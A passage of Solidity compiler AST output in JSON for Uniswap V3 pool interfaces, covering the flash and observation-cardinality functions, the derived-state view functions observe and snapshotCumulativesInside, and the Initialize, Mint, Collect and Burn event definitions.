									"id": 1383,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flash",
									"nameLocation": "5708:5:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1381,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1374,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "5731:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1383,
												"src": "5723:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1373,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5723:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1376,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "5758:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1383,
												"src": "5750:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1375,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5750:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1378,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "5783:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1383,
												"src": "5775:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1377,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5775:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1380,
												"mutability": "mutable",
												"name": "data",
												"nameLocation": "5815:4:3",
												"nodeType": "VariableDeclaration",
												"scope": 1383,
												"src": "5800:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1379,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "5800:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5713:112:3"
									},
									"returnParameters": {
										"id": 1382,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5834:0:3"
									},
									"scope": 1390,
									"src": "5699:136:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1384,
										"nodeType": "StructuredDocumentation",
										"src": "5841:367:3",
										"text": "@notice Increase the maximum number of price and liquidity observations that this pool will store\n @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n the input observationCardinalityNext.\n @param observationCardinalityNext The desired minimum number of observations for the pool to store"
									},
									"functionSelector": "32148f67",
									"id": 1389,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "increaseObservationCardinalityNext",
									"nameLocation": "6222:34:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1387,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1386,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nameLocation": "6264:26:3",
												"nodeType": "VariableDeclaration",
												"scope": 1389,
												"src": "6257:33:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1385,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "6257:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6256:35:3"
									},
									"returnParameters": {
										"id": 1388,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6300:0:3"
									},
									"scope": 1390,
									"src": "6213:88:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1391,
							"src": "173:6130:3",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "45:6259:3"
				},
				"id": 3
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolDerivedState": [
							1421
						]
					},
					"id": 1422,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1392,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3PoolDerivedState",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1393,
								"nodeType": "StructuredDocumentation",
								"src": "71:222:4",
								"text": "@title Pool state that is not stored\n @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n blockchain. The functions here may have variable gas costs."
							},
							"fullyImplemented": false,
							"id": 1421,
							"linearizedBaseContracts": [
								1421
							],
							"name": "IUniswapV3PoolDerivedState",
							"nameLocation": "303:26:4",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"documentation": {
										"id": 1394,
										"nodeType": "StructuredDocumentation",
										"src": "336:1045:4",
										"text": "@notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n you must call it with secondsAgos = [3600, 0].\n @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n timestamp"
									},
									"functionSelector": "883bdbfd",
									"id": 1406,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observe",
									"nameLocation": "1395:7:4",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1398,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1397,
												"mutability": "mutable",
												"name": "secondsAgos",
												"nameLocation": "1421:11:4",
												"nodeType": "VariableDeclaration",
												"scope": 1406,
												"src": "1403:29:4",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint32_$dyn_calldata_ptr",
													"typeString": "uint32[]"
												},
												"typeName": {
													"baseType": {
														"id": 1395,
														"name": "uint32",
														"nodeType": "ElementaryTypeName",
														"src": "1403:6:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"id": 1396,
													"nodeType": "ArrayTypeName",
													"src": "1403:8:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint32_$dyn_storage_ptr",
														"typeString": "uint32[]"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1402:31:4"
									},
									"returnParameters": {
										"id": 1405,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1401,
												"mutability": "mutable",
												"name": "tickCumulatives",
												"nameLocation": "1496:15:4",
												"nodeType": "VariableDeclaration",
												"scope": 1406,
												"src": "1481:30:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_int56_$dyn_memory_ptr",
													"typeString": "int56[]"
												},
												"typeName": {
													"baseType": {
														"id": 1399,
														"name": "int56",
														"nodeType": "ElementaryTypeName",
														"src": "1481:5:4",
														"typeDescriptions": {
															"typeIdentifier": "t_int56",
															"typeString": "int56"
														}
													},
													"id": 1400,
													"nodeType": "ArrayTypeName",
													"src": "1481:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_int56_$dyn_storage_ptr",
														"typeString": "int56[]"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1404,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128s",
												"nameLocation": "1530:34:4",
												"nodeType": "VariableDeclaration",
												"scope": 1406,
												"src": "1513:51:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint160_$dyn_memory_ptr",
													"typeString": "uint160[]"
												},
												"typeName": {
													"baseType": {
														"id": 1402,
														"name": "uint160",
														"nodeType": "ElementaryTypeName",
														"src": "1513:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														}
													},
													"id": 1403,
													"nodeType": "ArrayTypeName",
													"src": "1513:9:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint160_$dyn_storage_ptr",
														"typeString": "uint160[]"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1480:85:4"
									},
									"scope": 1421,
									"src": "1386:180:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1407,
										"nodeType": "StructuredDocumentation",
										"src": "1572:771:4",
										"text": "@notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n snapshot is taken and the second snapshot is taken.\n @param tickLower The lower tick of the range\n @param tickUpper The upper tick of the range\n @return tickCumulativeInside The snapshot of the tick accumulator for the range\n @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n @return secondsInside The snapshot of seconds per liquidity for the range"
									},
									"functionSelector": "a38807f2",
									"id": 1420,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "snapshotCumulativesInside",
									"nameLocation": "2357:25:4",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1412,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1409,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "2389:9:4",
												"nodeType": "VariableDeclaration",
												"scope": 1420,
												"src": "2383:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1408,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2383:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1411,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "2406:9:4",
												"nodeType": "VariableDeclaration",
												"scope": 1420,
												"src": "2400:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1410,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2400:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2382:34:4"
									},
									"returnParameters": {
										"id": 1419,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1414,
												"mutability": "mutable",
												"name": "tickCumulativeInside",
												"nameLocation": "2483:20:4",
												"nodeType": "VariableDeclaration",
												"scope": 1420,
												"src": "2477:26:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 1413,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "2477:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1416,
												"mutability": "mutable",
												"name": "secondsPerLiquidityInsideX128",
												"nameLocation": "2525:29:4",
												"nodeType": "VariableDeclaration",
												"scope": 1420,
												"src": "2517:37:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1415,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "2517:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1418,
												"mutability": "mutable",
												"name": "secondsInside",
												"nameLocation": "2575:13:4",
												"nodeType": "VariableDeclaration",
												"scope": 1420,
												"src": "2568:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1417,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2568:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2463:135:4"
									},
									"scope": 1421,
									"src": "2348:251:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1422,
							"src": "293:2308:4",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "45:2557:4"
				},
				"id": 4
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
					"exportedSymbols": {
						"IUniswapV3PoolEvents": [
							1540
						]
					},
					"id": 1541,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1423,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:5"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3PoolEvents",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1424,
								"nodeType": "StructuredDocumentation",
								"src": "71:88:5",
								"text": "@title Events emitted by a pool\n @notice Contains all events emitted by the pool"
							},
							"fullyImplemented": true,
							"id": 1540,
							"linearizedBaseContracts": [
								1540
							],
							"name": "IUniswapV3PoolEvents",
							"nameLocation": "169:20:5",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 1425,
										"nodeType": "StructuredDocumentation",
										"src": "196:344:5",
										"text": "@notice Emitted exactly once by a pool when #initialize is first called on the pool\n @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
									},
									"eventSelector": "98636036cb66a9c19a37435efc1e90142190214e8abeb821bdba3f2990dd4c95",
									"id": 1431,
									"name": "Initialize",
									"nameLocation": "551:10:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1430,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1427,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nameLocation": "570:12:5",
												"nodeType": "VariableDeclaration",
												"scope": 1431,
												"src": "562:20:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1426,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "562:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1429,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nameLocation": "590:4:5",
												"nodeType": "VariableDeclaration",
												"scope": 1431,
												"src": "584:10:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1428,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "584:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "561:34:5"
									},
									"src": "545:51:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1432,
										"nodeType": "StructuredDocumentation",
										"src": "602:551:5",
										"text": "@notice Emitted when liquidity is minted for a given position\n @param sender The address that minted the liquidity\n @param owner The owner of the position and recipient of any minted liquidity\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity minted to the position range\n @param amount0 How much token0 was required for the minted liquidity\n @param amount1 How much token1 was required for the minted liquidity"
									},
									"eventSelector": "7a53080ba414158be7ec69b987b5fb7d07dee101fe85488f0853ae16239d0bde",
									"id": 1448,
									"name": "Mint",
									"nameLocation": "1164:4:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1447,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1434,
												"indexed": false,
												"mutability": "mutable",
												"name": "sender",
												"nameLocation": "1186:6:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1178:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1433,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1178:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1436,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1218:5:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1202:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1435,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1202:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1438,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "1247:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1233:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1437,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1233:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1440,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "1280:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1266:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1439,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1266:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1442,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "1307:6:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1299:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1441,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1299:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1444,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "1331:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1323:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1443,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1323:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1446,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "1356:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1448,
												"src": "1348:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1445,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1348:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1168:201:5"
									},
									"src": "1158:212:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1449,
										"nodeType": "StructuredDocumentation",
										"src": "1376:493:5",
										"text": "@notice Emitted when fees are collected by the owner of a position\n @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n @param owner The owner of the position for which fees are collected\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount0 The amount of token0 fees collected\n @param amount1 The amount of token1 fees collected"
									},
									"eventSelector": "70935338e69775456a85ddef226c395fb668b63fa0115f5f20610b388e6ca9c0",
									"id": 1463,
									"name": "Collect",
									"nameLocation": "1880:7:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1462,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1451,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1913:5:5",
												"nodeType": "VariableDeclaration",
												"scope": 1463,
												"src": "1897:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1450,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1897:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1453,
												"indexed": false,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "1936:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1463,
												"src": "1928:17:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1452,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1928:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1455,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "1969:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1463,
												"src": "1955:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1454,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1955:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1457,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "2002:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1463,
												"src": "1988:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1456,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1988:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1459,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "2029:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1463,
												"src": "2021:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1458,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2021:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1461,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "2054:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1463,
												"src": "2046:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1460,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2046:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1887:180:5"
									},
									"src": "1874:194:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1464,
										"nodeType": "StructuredDocumentation",
										"src": "2074:523:5",
										"text": "@notice Emitted when a position's liquidity is removed\n @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n @param owner The owner of the position for which liquidity is removed\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity to remove\n @param amount0 The amount of token0 withdrawn\n @param amount1 The amount of token1 withdrawn"
									},
									"eventSelector": "0c396cd989a39f4459b5fa1aed6a9a8dcdbc45908acfd67e028cd568da98982c",
									"id": 1478,
									"name": "Burn",
									"nameLocation": "2608:4:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1477,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1466,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "2638:5:5",
												"nodeType": "VariableDeclaration",
												"scope": 1478,
												"src": "2622:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1465,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2622:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1468,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "2667:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1478,
												"src": "2653:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1467,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2653:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1470,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "2700:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1478,
												"src": "2686:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1469,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2686:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1472,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "2727:6:5",
												"nodeType": "VariableDeclaration",
												"scope": 1478,
												"src": "2719:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1471,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1474,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "2751:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1478,
												"src": "2743:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1473,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2743:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
